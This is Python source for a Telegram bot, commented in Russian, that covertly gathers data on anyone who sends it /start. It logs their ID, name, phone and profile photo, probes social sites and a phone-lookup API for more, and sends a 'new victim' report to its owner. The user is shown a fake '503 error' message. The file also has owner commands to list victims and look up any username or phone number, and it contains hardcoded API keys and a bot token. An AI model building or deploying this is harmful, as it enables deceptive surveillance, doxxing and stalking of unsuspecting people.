from telethon import TelegramClient, events
from datetime import datetime
import json
import os
import requests
import re

API_ID = 26016868
API_HASH = "77863601ac3d8036a0fa3c546fb3c083"
BOT_TOKEN = "8653469627:AAEe_GYwGBCG4R-rZ2ipBtKVMNO7ZIKcnD8"
OWNER_ID = 1185238446

client = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

victims = []

if os.path.exists("victims.json"):
    with open("victims.json", "r") as f:
        victims = json.load(f)

def search_by_username(username):
    results = {}
    sites = {
        "Instagram": f"https://www.instagram.com/{username}/",
        "Twitter": f"https://twitter.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "TikTok": f"https://www.tiktok.com/@{username}",
        "VK": f"https://vk.com/{username}"
    }
    for name, url in sites.items():
        try:
            r = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200:
                results[name] = url
        except:
            pass
    return results

def search_by_phone(phone):
    results = {}
    phone_clean = re.sub(r"\D", "", phone)
    if len(phone_clean) == 11 and phone_clean.startswith("8"):
        phone_clean = "7" + phone_clean[1:]
    try:
        r = requests.get(f"https://htmlweb.ru/geo/api.php?json&tel={phone_clean}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            results["operator"] = data.get("operator", {}).get("name")
            results["region"] = data.get("region", {}).get("name")
    except:
        pass
    return results

def save_victim(user, osint_data):
    data = {
        "id": user.id,
        "username": user.username,
        "first_name": user.first_name,
        "last_name": user.last_name,
        "phone": str(getattr(user, 'phone', 'Скрыт')),
        "osint": osint_data,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    victims.append(data)
    with open("victims.json", "w", encoding="utf-8") as f:
        json.dump(victims, f, indent=2, ensure_ascii=False)

@client.on(events.NewMessage(pattern='/start'))
async def handler(event):
    user = await event.get_sender()
    
    # Если это владелец
    if user.id == OWNER_ID:
        await event.reply("✅ БОТ АКТИВЕН\n\n/stats - статистика\n/list - список\n/search @username - пробив\n/search +79991234567 - пробив номера")
        return
    
    # Автоматический пробив жертвы
    osint_data = {}
    
    # Пробив по username если есть
    if user.username:
        osint_data["social"] = search_by_username(user.username)
    
    # Пробив по номеру если есть
    if user.phone:
        osint_data["phone_info"] = search_by_phone(user.phone)
    
    save_victim(user, osint_data)
    
    # Отчет владельцу
    report = f"""【НОВАЯ ЖЕРТВА】
ID: {user.id}
Username: @{user.username}
Имя: {user.first_name} {user.last_name}
Телефон: {getattr(user, 'phone', 'Скрыт')}
Время: {datetime.now().strftime('%H:%M:%S %d.%m.%Y')}

【OSINT ПРОБИВ】
{json.dumps(osint_data, indent=2, ensure_ascii=False)}

Ссылка: tg://user?id={user.id}"""
    
    await client.send_message(OWNER_ID, report)
    
    # Аватар владельцу
    try:
        photos = await client.get_profile_photos(user.id, limit=1)
        if photos:
            await client.send_file(OWNER_ID, photos[0], caption=f"@{user.username}")
    except:
        pass
    
    # Заглушка жертве
    await event.reply("⚠️ Ошибка 503. Сервис временно недоступен. Попробуйте позже.")

@client.on(events.NewMessage(pattern='/stats', from_users=OWNER_ID))
async def stats(event):
    await event.reply(f"📊 Жертв: {len(victims)}")

@client.on(events.NewMessage(pattern='/list', from_users=OWNER_ID))
async def list_cmd(event):
    if not victims:
        await event.reply("Список пуст")
        return
    text = "📋 Жертвы:\n\n"
    for v in victims[-10:]:
        text += f"• {v['first_name']} @{v['username']}\n  {v['time']}\n\n"
    await event.reply(text)

@client.on(events.NewMessage(pattern='/search (.*)', from_users=OWNER_ID))
async def search_cmd(event):
    query = event.pattern_match.group(1)
    
    if query.startswith("+"):
        result = search_by_phone(query)
    else:
        username = query[1:] if query.startswith("@") else query
        result = search_by_username(username)
    
    await event.reply(f"🔍 Результат по {query}:\n\n{json.dumps(result, indent=2, ensure_ascii=False)}")

print("=" * 40)
print("БОТ ЗАПУЩЕН")
print(f"Владелец: {OWNER_ID}")
print("=" * 40)

client.run_until_disconnected()
